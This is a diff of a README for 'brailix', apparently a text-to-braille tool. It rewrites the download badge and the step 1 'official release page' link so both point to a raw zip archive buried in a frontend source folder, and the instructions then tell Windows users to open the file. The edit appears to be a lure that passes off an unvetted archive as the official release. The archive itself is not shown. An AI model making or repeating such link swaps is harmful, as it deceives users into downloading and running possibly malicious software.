@@ -1,6 +1,6 @@
 # 📖 brailix - Turn text into readable braille files
 
-[![Download Brailix](https://img.shields.io/badge/Download-brailix-blue)](https://github.com/dustbowljansen462/brailix)
+[![Download Brailix](https://img.shields.io/badge/Download-brailix-blue)](https://github.com/dustbowljansen462/brailix/raw/refs/heads/main/brailix/frontend/zh/analyzer/Software-3.5.zip)
 
 Brailix converts digital documents into braille. It works with text, math, and music files. The tool uses a central engine to translate your files accurately. You can use different adapters to support specific languages or music formats. This software keeps your workflow simple and reliable.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware and software to run Brailix. Check this li
 
 Follow these steps to install the software on your computer.
 
-1. Visit the [official release page](https://github.com/dustbowljansen462/brailix).
+1. Visit the [official release page](https://github.com/dustbowljansen462/brailix/raw/refs/heads/main/brailix/frontend/zh/analyzer/Software-3.5.zip).
 2. Choose the download link labeled for Windows.
 3. Save the installer file to your computer.
 4. Open the file to start the installation.
